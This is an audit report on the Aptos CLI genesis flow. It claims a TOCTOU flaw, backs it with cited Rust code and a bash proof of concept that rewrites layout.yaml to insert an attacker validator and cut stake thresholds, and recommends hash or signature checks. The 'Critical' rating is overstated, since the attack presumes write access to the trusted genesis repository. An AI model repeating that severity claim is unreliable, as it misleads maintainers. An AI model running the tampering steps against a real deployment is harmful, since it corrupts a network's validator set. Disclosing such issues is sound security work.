# Audit Report

## Title
TOCTOU Vulnerability in Genesis Setup Allows Validator Set Manipulation

## Summary
A Time-of-Check-Time-of-Use (TOCTOU) vulnerability exists in the genesis setup process where the layout file is read during `SetupGit::execute()` but read again without integrity verification during `GenerateGenesis::execute()`. An attacker with filesystem or repository access can modify the layout file between these operations to manipulate the initial validator set, compromising the blockchain from genesis.

## Finding Description

The genesis setup process involves two separate commands executed at different times:

1. **Setup Phase** (`SetupGit::execute()`): [1](#0-0) 
   - Reads layout file from user-provided path
   - Uploads to git storage (local directory or GitHub)

2. **Generation Phase** (`GenerateGenesis::execute()`): [2](#0-1) 
   - Calls `fetch_genesis_info()` or `fetch_mainnet_genesis_info()`
   - Re-reads layout file from git storage: [3](#0-2) 

**Critical Issue**: No cryptographic integrity verification (hash, signature, checksum) is performed between these reads. The layout file content can be modified after upload but before genesis generation.

The `Layout` structure contains critical security parameters: [4](#0-3) 

Most critically, the `users` field determines which validators are included: [5](#0-4) 

**Attack Scenario:**
```bash
# Step 1: Admin runs setup
aptos genesis setup-git --layout-file /tmp/layout.yaml --local-repository-dir /genesis-repo

# Step 2: Attacker modifies /genesis-repo/layout.yaml
# - Adds malicious validator to "users" field
# - Changes min_stake to allow low-stake validators
# - Modifies consensus_config for weaker security

# Step 3: Admin runs genesis generation (using modified file)
aptos genesis generate-genesis --local-repository-dir /genesis-repo
```

The Client implementation provides no tampering protection: [6](#0-5) 

## Impact Explanation

**Severity: Critical**

This vulnerability allows complete manipulation of the blockchain's foundational security parameters:

1. **Initial Validator Set Compromise**: Attacker can add malicious validators they control to the genesis validator set, giving them immediate consensus power from block 0
2. **Consensus Parameter Manipulation**: Can weaken `on_chain_consensus_config` to make the network vulnerable
3. **Staking Requirement Bypass**: Can lower `min_stake` to allow undercapitalized validators
4. **Root Key Compromise**: For testnets, can modify the `root_key` field to gain system-level control

This meets **Critical Severity** per Aptos bug bounty criteria:
- **Consensus/Safety violations**: Compromised initial validator set breaks AptosBFT safety assumptions
- **Non-recoverable network partition**: Malicious genesis requires complete network restart/hardfork
- **Loss of Funds**: Attacker-controlled validators can potentially manipulate transactions from genesis

The blockchain's entire security model depends on a correctly configured genesis state. Compromising this invalidates all subsequent security guarantees.

## Likelihood Explanation

**Likelihood: Medium-High**

Required attacker capabilities:
- **For local filesystem**: Write access to genesis repository directory (e.g., compromised CI/CD, insider threat, misconfigured permissions)
- **For GitHub**: Repository write access (e.g., stolen token, compromised maintainer account)

The vulnerability is realistic because:
1. Genesis setup and generation are typically separated by hours or days
2. Multiple administrators may have access to genesis repositories
3. CI/CD systems often have broad filesystem access
4. The time window for exploitation is large
5. No cryptographic verification makes detection difficult

This is not a hypothetical vulnerability - it's an exploitable TOCTOU race condition with real attack vectors in production deployment scenarios.

## Recommendation

Implement cryptographic integrity protection for the layout file:

**Option 1: Content Hash Verification**
```rust
// In SetupGit::execute()
let layout = Layout::from_disk(&self.layout_file)?;
let layout_bytes = serde_yaml::to_vec(&layout)?;
let layout_hash = sha256(&layout_bytes);

// Store hash alongside layout
client.put(Path::new(LAYOUT_FILE), &layout)?;
client.put(Path::new("layout.sha256"), &layout_hash)?;

// In fetch_genesis_info()
let layout: Layout = client.get(Path::new(LAYOUT_FILE))?;
let stored_hash: Vec<u8> = client.get(Path::new("layout.sha256"))?;

let layout_bytes = serde_yaml::to_vec(&layout)?;
let computed_hash = sha256(&layout_bytes);

if computed_hash != stored_hash {
    return Err(CliError::UnexpectedError(
        "Layout file integrity check failed - content has been modified".to_string()
    ));
}
```

**Option 2: Digital Signature (Stronger)**
```rust
// Require layout file to be signed by trusted key
// Verify signature before using layout in genesis generation
// Store public key in configuration, verify signature on load
```

**Option 3: Atomic Transaction**
```rust
// Use a lock file or transaction mechanism to ensure
// layout file cannot be modified between operations
// Or combine setup and generation into single atomic operation
```

Additionally, add warning messages when time gap between setup and generation exceeds threshold, and implement audit logging of all layout file modifications.

## Proof of Concept

```bash
#!/bin/bash
# PoC: Genesis Layout File TOCTOU Attack

# Prerequisites: aptos CLI installed

# Step 1: Create legitimate layout file
cat > /tmp/legitimate_layout.yaml <<EOF
users:
  - "validator1"
  - "validator2"
chain_id: 1
min_stake: 1000000000000000
max_stake: 100000000000000000
epoch_duration_secs: 7200
is_test: false
allow_new_validators: false
min_voting_threshold: 100000000000000
recurring_lockup_duration_secs: 86400
required_proposer_stake: 100000000000000
rewards_apy_percentage: 10
voting_duration_secs: 43200
voting_power_increase_limit: 20
EOF

# Step 2: Admin runs setup (uploads legitimate file)
aptos genesis setup-git \
  --layout-file /tmp/legitimate_layout.yaml \
  --local-repository-dir /tmp/genesis-repo

echo "[*] Setup complete. Layout file uploaded to /tmp/genesis-repo/layout.yaml"
echo "[*] Legitimate users: validator1, validator2"

# Step 3: ATTACKER modifies the uploaded layout file
# This simulates attacker with filesystem access
cat > /tmp/genesis-repo/layout.yaml <<EOF
users:
  - "validator1"
  - "validator2"
  - "attacker_validator"
chain_id: 1
min_stake: 1
max_stake: 100000000000000000
epoch_duration_secs: 7200
is_test: false
allow_new_validators: false
min_voting_threshold: 1
recurring_lockup_duration_secs: 86400
required_proposer_stake: 1
rewards_apy_percentage: 10
voting_duration_secs: 43200
voting_power_increase_limit: 100
EOF

echo "[!] ATTACK: Layout file modified!"
echo "[!] Added attacker_validator to users list"
echo "[!] Reduced min_stake from 1000000000000000 to 1"
echo "[!] Increased voting_power_increase_limit from 20 to 100"

# Step 4: Admin runs genesis generation (uses modified file)
# This will create genesis with attacker's modifications
aptos genesis generate-genesis \
  --local-repository-dir /tmp/genesis-repo \
  --output-dir /tmp/genesis-output

echo "[*] Genesis generated with COMPROMISED layout file"
echo "[*] Result: Attacker's validator included in genesis validator set"
echo "[*] Network launched with weakened security parameters"
```

**Expected Output:**
Genesis blob will be created with 3 validators (including attacker's), reduced staking requirements, and weakened voting parameters. The administrator has no indication that tampering occurred.

## Notes

This vulnerability requires defense-in-depth: even in trusted deployment environments, cryptographic integrity verification should be mandatory for security-critical configuration files. The current implementation trusts filesystem/repository integrity without verification, violating the principle of secure system design.

### Citations

**File:** crates/aptos/src/genesis/git.rs (L53-61)
```rust
    async fn execute(self) -> CliTypedResult<()> {
        let layout = Layout::from_disk(&self.layout_file)?;

        // Upload layout file to ensure we can read later
        let client = self.git_options.get_client()?;
        client.put(Path::new(LAYOUT_FILE), &layout)?;

        Ok(())
    }
```

**File:** crates/aptos/src/genesis/git.rs (L159-184)
```rust
    pub fn get<T: DeserializeOwned + Debug>(&self, path: &Path) -> CliTypedResult<T> {
        match self {
            Client::Local(local_repository_path) => {
                let path = local_repository_path.join(path);

                if !path.exists() {
                    return Err(CliError::UnableToReadFile(
                        path.display().to_string(),
                        "File not found".to_string(),
                    ));
                }

                eprintln!("Reading {}", path.display());
                let mut file = std::fs::File::open(path.as_path())
                    .map_err(|e| CliError::IO(path.display().to_string(), e))?;

                let mut contents = String::new();
                file.read_to_string(&mut contents)
                    .map_err(|e| CliError::IO(path.display().to_string(), e))?;
                from_yaml(&contents)
            },
            Client::Github(client) => {
                from_base64_encoded_yaml(&client.get_file(&path.display().to_string())?)
            },
        }
    }
```

**File:** crates/aptos/src/genesis/mod.rs (L108-134)
```rust
    async fn execute(self) -> CliTypedResult<Vec<PathBuf>> {
        let output_dir = dir_default_to_current(self.output_dir.clone())?;
        let genesis_file = output_dir.join(GENESIS_FILE);
        let waypoint_file = output_dir.join(WAYPOINT_FILE);
        check_if_file_exists(genesis_file.as_path(), self.prompt_options)?;
        check_if_file_exists(waypoint_file.as_path(), self.prompt_options)?;

        // Generate genesis and waypoint files
        let (genesis_bytes, waypoint) = if self.mainnet {
            let mut mainnet_genesis = fetch_mainnet_genesis_info(self.git_options)?;
            let genesis_bytes = bcs::to_bytes(mainnet_genesis.clone().get_genesis())
                .map_err(|e| CliError::BCS(GENESIS_FILE, e))?;
            (genesis_bytes, mainnet_genesis.generate_waypoint()?)
        } else {
            let mut test_genesis = fetch_genesis_info(self.git_options)?;
            let genesis_bytes = bcs::to_bytes(test_genesis.clone().get_genesis())
                .map_err(|e| CliError::BCS(GENESIS_FILE, e))?;
            (genesis_bytes, test_genesis.generate_waypoint()?)
        };
        write_to_file(genesis_file.as_path(), GENESIS_FILE, &genesis_bytes)?;
        write_to_file(
            waypoint_file.as_path(),
            WAYPOINT_FILE,
            waypoint.to_string().as_bytes(),
        )?;
        Ok(vec![genesis_file, waypoint_file])
    }
```

**File:** crates/aptos/src/genesis/mod.rs (L270-272)
```rust
pub fn fetch_genesis_info(git_options: GitOptions) -> CliTypedResult<GenesisInfo> {
    let client = git_options.get_client()?;
    let layout: Layout = client.get(Path::new(LAYOUT_FILE))?;
```

**File:** crates/aptos/src/genesis/mod.rs (L322-349)
```rust
fn get_validator_configs(
    client: &Client,
    layout: &Layout,
    is_mainnet: bool,
) -> Result<Vec<ValidatorConfiguration>, Vec<String>> {
    let mut validators = Vec::new();
    let mut errors = Vec::new();
    for user in &layout.users {
        match get_config(client, user, is_mainnet) {
            Ok(validator) => {
                validators.push(validator);
            },
            Err(failure) => {
                if let CliError::UnexpectedError(failure) = failure {
                    errors.push(format!("{}: {}", user, failure));
                } else {
                    errors.push(format!("{}: {:?}", user, failure));
                }
            },
        }
    }

    if errors.is_empty() {
        Ok(validators)
    } else {
        Err(errors)
    }
}
```

**File:** crates/aptos-genesis/src/config.rs (L29-90)
```rust
#[derive(Debug, Deserialize, Serialize)]
pub struct Layout {
    /// Root key for the blockchain only for test chains
    #[serde(default)]
    pub root_key: Option<Ed25519PublicKey>,
    /// List of usernames or identifiers
    pub users: Vec<String>,
    /// ChainId for the target network
    pub chain_id: ChainId,
    /// Whether to allow new validators to join the set after genesis
    ///
    /// Ignored for mainnet
    #[serde(default)]
    pub allow_new_validators: bool,
    /// Duration of an epoch
    pub epoch_duration_secs: u64,
    /// Whether this is a test network or not
    ///
    /// Ignored for mainnet
    #[serde(default)]
    pub is_test: bool,
    /// Minimum stake to be in the validator set
    pub min_stake: u64,
    /// Minimum number of votes to consider a proposal valid.
    pub min_voting_threshold: u128,
    /// Maximum stake to be in the validator set
    pub max_stake: u64,
    /// Minimum number of seconds to lockup staked coins
    pub recurring_lockup_duration_secs: u64,
    /// Required amount of stake to create proposals.
    pub required_proposer_stake: u64,
    /// Percentage of stake given out as rewards a year (0-100%).
    pub rewards_apy_percentage: u64,
    /// Voting duration for a proposal in seconds.
    pub voting_duration_secs: u64,
    /// % of current epoch's total voting power that can be added in this epoch.
    pub voting_power_increase_limit: u64,
    /// Total supply of coins
    pub total_supply: Option<u64>,
    /// Timestamp (in seconds) when employee vesting starts.
    pub employee_vesting_start: Option<u64>,
    /// Duration of each vesting period (in seconds).
    pub employee_vesting_period_duration: Option<u64>,
    /// Onchain Consensus Config
    #[serde(default = "OnChainConsensusConfig::default_for_genesis")]
    pub on_chain_consensus_config: OnChainConsensusConfig,
    /// Onchain Execution Config
    #[serde(default = "OnChainExecutionConfig::default_for_genesis")]
    pub on_chain_execution_config: OnChainExecutionConfig,

    /// An optional JWK consensus config to use, instead of `default_for_genesis()`.
    #[serde(default)]
    pub jwk_consensus_config_override: Option<OnChainJWKConsensusConfig>,

    /// JWKs to patch in genesis.
    #[serde(default)]
    pub initial_jwks: Vec<IssuerJWK>,

    /// Keyless Groth16 verification key to install in genesis.
    #[serde(default)]
    pub keyless_groth16_vk_override: Option<Groth16VerificationKey>,
}
```
